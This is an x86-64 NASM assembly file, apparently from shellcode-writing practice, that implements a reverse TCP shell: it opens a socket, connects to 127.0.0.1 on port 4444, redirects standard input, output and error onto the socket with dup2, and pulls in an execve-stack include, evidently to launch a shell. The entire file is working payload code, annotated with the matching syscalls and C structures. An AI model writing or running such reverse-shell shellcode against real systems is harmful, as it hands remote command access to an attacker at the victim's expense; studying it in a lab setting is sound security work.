global _start

%define _START
_start:

    ; sock = socket(AF_INET, SOCK_STREAM, 0)
    ; AF_INET = 2
    ; SOCK_STREAM = 1
    ; __NR_socket = 41

    mov rax, 41
    mov rdi, 2
    mov rsi, 1
    mov rdx, 0
    syscall

    mov rdi, rax

    ; server.sin_family = AF_INET;    short
    ; server.sin_port = htons(4444);    unsigned short
    ; server.sin_addr.s_addr = inet_addr("127.0.0.1");    unsigned long
    ; bzero(&server.sin_zero, 8);
    ; AF_INET = 2
    ;
    ; https://beej.us/guide/bgnet/html/multi/sockaddr_inman.html
    ; struct sockaddr_in {
    ;     short            sin_family;
    ;     unsigned short   sin_port;
    ;     struct in_addr   sin_addr;
    ;     char             sin_zero[8];
    ; };
    ;
    ; connect(sock, (struct sockaddr *)&server, sockaddr_len)
    ; __NR_connect = 42

    xor rax, rax
    push rax          ; bzero()
    mov dword [rsp-4], 0x0100007f
    sub rsp, 4
    push word 0x5c11  ; htons(4444)
    push word 2

    ; connect
    mov rax, 42
    mov rsi, rsp
    mov rdx, 16  ; sizeof(sockaddr_in)
    syscall

    ; dup2(sock, 0);
    ; dup2(sock, 1);
    ; dup2(sock, 2);
    ; __NR_dup2 = 33

    mov rax, 33
    xor rsi, rsi
    syscall

    mov rax, 33
    inc rsi
    syscall

    mov rax, 33
    inc rsi
    syscall

    %include "execve-stack.nasm"
